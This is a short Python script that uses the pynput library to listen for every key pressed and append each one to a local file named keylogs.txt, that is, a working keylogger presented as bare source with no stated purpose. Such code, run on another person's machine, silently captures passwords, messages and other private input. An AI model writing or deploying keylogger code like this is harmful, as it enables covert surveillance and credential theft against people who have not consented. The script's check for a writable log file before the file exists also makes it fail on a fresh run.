from pynput import keyboard
import os

def on_press(key):
    try:
        with open("keylogs.txt", "a") as file:
            if hasattr(key, 'char'):
                file.write(key.char)
            else:
                file.write(str(key))
    except Exception as e:
        print(f"Error occurred: {e}")

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    if os.access("keylogs.txt", os.W_OK):
        main()
    else:
        print("Error: keylogs.txt is not writable.")